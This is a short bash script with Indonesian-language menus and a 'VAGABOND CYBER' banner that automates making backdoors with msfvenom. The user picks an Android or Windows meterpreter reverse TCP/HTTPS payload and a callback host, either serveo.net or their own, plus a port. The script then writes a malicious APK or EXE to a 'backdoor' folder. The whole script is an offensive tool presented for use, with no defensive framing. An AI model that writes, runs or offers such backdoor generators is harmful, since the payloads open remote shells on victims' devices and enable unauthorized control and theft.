#!bin/bash
mkdir backdoor
clear
autobackdoor(){
echo '                            Create Backdoor '
sleep 1s
echo -n '                                 .'
sleep 1s
echo -n '.'
sleep 1s
echo '.'
x=1
while [ $x -le 76 ]
do
  echo -n "="
  sleep 0.02
  x=$(( $x + 1 ))
done
echo ''
toilet -f shadow -F metal 'VAGABOND CYBER'
sleep 0.2
echo '   -- Pilih Backdoor -- '
sleep 0.08
echo '  [1] android_meterpreter_tcp'
sleep 0.08
echo '  [2] android_meterpreter_https'
sleep 0.08
echo '  [3] windows_meterpreter_tcp'
sleep 0.08
echo '  [4] windows_meterpreter_https'
sleep 0.08
pilihBackdoor(){
echo -n 'Masukan  nomor pilihan : '
read nomor
case $nomor in
1)
  tcp="android/meterpreter/reverse_tcp"
  ext="raw"
  ext1="apk"
  ;;
2)
  tcp="android/meterpreter/reverse_https"
  ext="raw"
  ext1="apk"
  ;;
3)
  tcp="windows/meterpreter/reverse_tcp"
  ext="exe"
  ext1="exe"
  ;;
4)
  tcp="windows/meterpreter/reverse_https"
  ext="exe"
  ext1="exe"
  ;;
*)
  echo "X input tidak sesuai-pilih nomor X"
  pilihBackdoor
  ;;
esac
}
pilihBackdoor
sleep 0.09
echo ' -- Pilih Host --'
sleep 0.08
echo '  [1] serveo.net'
echo '  [2] Input Sendiri Host/Ip'
pilihHost(){
echo -n 'Masukan nomor Pilihan  : '
read nhost
case $nhost in
1)
  host="serveo.net"
  ;;
2)
  echo -n 'Masukan Host/Ip : '
  read host
  ;;
*)
  echo "X input tidak sesuai-pilih nomor X"
  pilihHost
  ;;
esac
}
pilihHost
echo -n 'Masukan port : '
read port
echo $tcp
echo $ext
echo $host
echo $port
msfvenom -p $tcp LHOST=$host LPORT=$port -f $ext -o backdoor/backdoor.$ext1
}
autobackdoor | lolcat
